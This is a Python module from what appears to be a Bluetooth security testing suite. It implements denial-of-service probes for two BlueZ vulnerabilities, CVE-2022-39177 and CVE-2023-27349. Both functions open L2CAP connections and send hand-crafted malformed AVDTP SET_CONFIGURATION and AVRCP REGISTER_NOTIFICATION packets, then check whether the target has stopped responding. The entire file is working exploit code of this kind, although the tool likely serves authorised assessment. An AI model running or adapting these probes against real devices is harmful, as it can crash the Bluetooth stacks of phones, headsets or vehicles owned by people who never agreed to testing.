"""Classic Bluetooth CVE-specific DoS probes for the modular DoS suite."""

from __future__ import annotations

import socket
import struct
import time
from typing import Any

from blue_tap.recon.sdp import browse_services


AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
BTPROTO_L2CAP = getattr(socket, "BTPROTO_L2CAP", 0)
PSM_AVCTP = 0x0017
PSM_AVDTP = 0x0019

AVCTP_PID_AVRCP = 0x110E
AVDTP_DISCOVER = 0x01
AVDTP_GET_CAPABILITIES = 0x02
AVDTP_SET_CONFIGURATION = 0x03


def _l2cap_connect(address: str, psm: int, timeout: float = 5.0) -> socket.socket:
    sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
    sock.settimeout(timeout)
    sock.connect((address, psm))
    return sock


def _browse_services_safe(address: str, hci: str) -> list[dict]:
    try:
        return browse_services(address, hci=hci)
    except Exception:
        return []


def _has_service_uuid(services: list[dict], uuid_suffixes: tuple[str, ...]) -> bool:
    wanted = tuple(part.lower() for part in uuid_suffixes)
    for service in services:
        uuid = str(service.get("uuid", "")).lower()
        if any(part in uuid for part in wanted):
            return True
    return False


def _build_avdtp_packet(signal_id: int, payload: bytes = b"", transaction: int = 0,
                        message_type: int = 0, packet_type: int = 0) -> bytes:
    first = ((transaction & 0x0F) << 4) | ((packet_type & 0x03) << 2) | (message_type & 0x03)
    second = signal_id & 0x3F
    return bytes([first, second]) + payload


def _parse_avdtp_first_seid(response: bytes) -> int | None:
    if len(response) < 4:
        return None
    payload = response[2:]
    if len(payload) < 2:
        return None
    return (payload[0] >> 2) & 0x3F


def _probe_avdtp_alive(address: str) -> tuple[bool, str]:
    try:
        sock = _l2cap_connect(address, PSM_AVDTP, timeout=2.0)
    except OSError as exc:
        return False, f"AVDTP reconnect failed: {exc}"
    try:
        sock.sendall(_build_avdtp_packet(AVDTP_DISCOVER))
        try:
            sock.settimeout(1.5)
            resp = sock.recv(128)
        except TimeoutError:
            resp = b""
        if resp:
            return True, f"AVDTP DISCOVER response len={len(resp)}"
        return True, "AVDTP reconnect succeeded"
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _connect_avctp(address: str, timeout: float = 5.0) -> socket.socket:
    sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
    sock.settimeout(timeout)
    sock.connect((address, PSM_AVCTP))
    return sock


def _probe_avctp_alive(address: str) -> tuple[bool, str]:
    sock = None
    try:
        sock = _connect_avctp(address, timeout=2.0)
        return True, "AVCTP reconnect succeeded"
    except OSError as exc:
        return False, f"AVCTP reconnect failed: {exc}"
    finally:
        try:
            sock.close()
        except Exception:
            pass


def bluez_avdtp_malformed_setconf(address: str, hci: str = "hci0",
                                  wait_after: float = 0.5) -> dict[str, Any]:
    """CVE-2022-39177 malformed AVDTP SET_CONFIGURATION crash probe."""
    start = time.time()
    services = _browse_services_safe(address, hci)
    if services and not _has_service_uuid(services, ("110a", "110b")):
        return {
            "target": address,
            "attack": "bluez_avdtp_malformed_setconf",
            "attack_name": "bluez_avdtp_malformed_setconf",
            "packets_sent": 0,
            "duration_seconds": round(time.time() - start, 2),
            "result": "not_applicable",
            "notes": "A2DP/AVDTP service UUID not present in SDP",
        }

    sock = None
    packets_sent = 0
    response_hex = ""
    seid = None
    try:
        sock = _l2cap_connect(address, PSM_AVDTP, timeout=5.0)

        discover = _build_avdtp_packet(AVDTP_DISCOVER)
        sock.sendall(discover)
        packets_sent += 1
        discover_rsp = sock.recv(256)
        seid = _parse_avdtp_first_seid(discover_rsp)
        if not seid:
            return {
                "target": address,
                "attack": "bluez_avdtp_malformed_setconf",
                "attack_name": "bluez_avdtp_malformed_setconf",
                "packets_sent": packets_sent,
                "duration_seconds": round(time.time() - start, 2),
                "result": "failed",
                "notes": f"AVDTP DISCOVER did not return a usable SEID (resp={discover_rsp.hex()})",
            }

        getcap = _build_avdtp_packet(AVDTP_GET_CAPABILITIES, bytes([seid << 2]))
        sock.sendall(getcap)
        packets_sent += 1
        try:
            sock.settimeout(2.0)
            sock.recv(512)
        except TimeoutError:
            pass

        # Media transport (required) followed by malformed media codec capability:
        # category 0x07, length 0x01, only 1 byte of codec payload.
        setconf_payload = bytes([
            seid << 2,   # ACP SEID
            0x04,        # INT SEID = 1
            0x01, 0x00,  # Media Transport capability
            0x07, 0x01,  # Media Codec capability, undersized length
            0x00,        # One byte of codec data
        ])
        setconf = _build_avdtp_packet(AVDTP_SET_CONFIGURATION, setconf_payload)
        sock.sendall(setconf)
        packets_sent += 1
        try:
            sock.settimeout(1.0)
            setconf_rsp = sock.recv(128)
            response_hex = setconf_rsp.hex()
        except TimeoutError:
            setconf_rsp = b""
    except OSError as exc:
        return {
            "target": address,
            "attack": "bluez_avdtp_malformed_setconf",
            "attack_name": "bluez_avdtp_malformed_setconf",
            "packets_sent": packets_sent,
            "duration_seconds": round(time.time() - start, 2),
            "result": "target_unresponsive",
            "notes": f"AVDTP signalling failed during malformed SET_CONFIGURATION flow: {exc}",
        }
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass

    time.sleep(max(wait_after, 0.0))
    alive, probe = _probe_avdtp_alive(address)
    if not alive:
        return {
            "target": address,
            "attack": "bluez_avdtp_malformed_setconf",
            "attack_name": "bluez_avdtp_malformed_setconf",
            "packets_sent": packets_sent,
            "duration_seconds": round(time.time() - start, 2),
            "result": "target_unresponsive",
            "notes": (
                f"Target stopped responding after malformed AVDTP SET_CONFIGURATION "
                f"(seid={seid}, response={response_hex or 'none'}; {probe})"
            ),
        }

    return {
        "target": address,
        "attack": "bluez_avdtp_malformed_setconf",
        "attack_name": "bluez_avdtp_malformed_setconf",
        "packets_sent": packets_sent,
        "duration_seconds": round(time.time() - start, 2),
        "result": "success",
        "notes": (
            f"Malformed AVDTP SET_CONFIGURATION completed without outage "
            f"(seid={seid}, response={response_hex or 'none'}; {probe})"
        ),
    }


def bluez_avrcp_event_oob(address: str, hci: str = "hci0", event_id: int = 0x0E,
                          wait_after: float = 0.5) -> dict[str, Any]:
    """CVE-2023-27349 AVRCP REGISTER_NOTIFICATION minimal OOB trigger."""
    start = time.time()
    services = _browse_services_safe(address, hci)
    if services and not _has_service_uuid(services, ("110c", "110e")):
        return {
            "target": address,
            "attack": "bluez_avrcp_event_oob",
            "attack_name": "bluez_avrcp_event_oob",
            "packets_sent": 0,
            "duration_seconds": round(time.time() - start, 2),
            "result": "not_applicable",
            "notes": "AVRCP service UUID not present in SDP",
        }

    avctp_hdr = struct.pack(">BH", 0x00, AVCTP_PID_AVRCP)
    avc_cmd = bytes([
        0x03,              # NOTIFY command
        0x48,              # panel subunit
        0x00,              # opcode = vendor dependent
        0x00, 0x19, 0x58,  # Bluetooth SIG company id
        0x31,              # REGISTER_NOTIFICATION
        0x00,
        0x00, 0x05,
        event_id & 0xFF,
        0x00, 0x00, 0x00, 0x00,
    ])
    packet = avctp_hdr + avc_cmd

    packets_sent = 0
    response_hex = ""
    sock = None
    try:
        sock = _connect_avctp(address, timeout=5.0)
        sock.sendall(packet)
        packets_sent += 1
        try:
            sock.settimeout(1.5)
            resp = sock.recv(128)
            response_hex = resp.hex()
        except TimeoutError:
            resp = b""
    except OSError as exc:
        return {
            "target": address,
            "attack": "bluez_avrcp_event_oob",
            "attack_name": "bluez_avrcp_event_oob",
            "packets_sent": packets_sent,
            "duration_seconds": round(time.time() - start, 2),
            "result": "target_unresponsive",
            "notes": f"AVRCP control channel dropped during event_id=0x{event_id:02X} probe: {exc}",
        }
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass

    time.sleep(max(wait_after, 0.0))
    alive, probe = _probe_avctp_alive(address)
    if not alive:
        return {
            "target": address,
            "attack": "bluez_avrcp_event_oob",
            "attack_name": "bluez_avrcp_event_oob",
            "packets_sent": packets_sent,
            "duration_seconds": round(time.time() - start, 2),
            "result": "target_unresponsive",
            "notes": (
                f"Target stopped responding after AVRCP REGISTER_NOTIFICATION "
                f"event_id=0x{event_id:02X} (response={response_hex or 'none'}; {probe})"
            ),
        }

    return {
        "target": address,
        "attack": "bluez_avrcp_event_oob",
        "attack_name": "bluez_avrcp_event_oob",
        "packets_sent": packets_sent,
        "duration_seconds": round(time.time() - start, 2),
        "result": "success",
        "notes": (
            f"AVRCP event_id=0x{event_id:02X} probe completed without outage "
            f"(response={response_hex or 'none'}; {probe})"
        ),
    }
